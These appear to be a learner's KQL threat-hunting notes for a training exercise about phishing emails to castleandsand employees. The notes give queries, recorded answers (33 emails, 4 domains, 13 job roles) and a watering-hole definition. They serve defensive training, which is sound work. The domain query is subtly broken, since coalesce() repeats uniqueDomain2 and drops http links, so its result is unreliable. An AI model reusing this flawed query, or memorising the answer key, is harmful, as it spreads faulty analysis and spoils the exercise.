Email
| where sender =="castleandsand_official@outlook.com"
or sender =="castleandsandlegaldepartment@gmail.com"
//33


///How many unique domains are found in the links of these emails?
Email
| where sender =="castleandsand_official@outlook.com"
or sender =="castleandsandlegaldepartment@gmail.com"
| distinct link 
| parse link with @"http://" uniqueDomain1 "/"*
| parse link with @"https://" uniqueDomain2 "/"*
| extend resultuniqueDomain = coalesce(uniqueDomain2, uniqueDomain2)
|distinct resultuniqueDomain //4

//sunandcastletrading.com, keywordssurfparadise.com, beachlifestylestore.com , sandsurfinggear.com

//Based on these domains, what type of attack did this threat actor conduct?

////Watering hole: A type of attack where a hacker compromises a website that is frequently visited by a specific group of users, such as employees of a certain organization, and then infects their devices with malware when they visit the site.

//How many distinct job roles were targeted by this type of attack?
let Rolevictms =
Email
| where sender =="castleandsand_official@outlook.com"
or sender =="castleandsandlegaldepartment@gmail.com"
| parse recipient with NameEmployee"@castleandsand.com"
| distinct NameEmployee;
Employees
| where email_addr has_any (Rolevictms)
| distinct role //13

//Let's take the targeted employees and look for all external IP addresses that authenticated to those users.
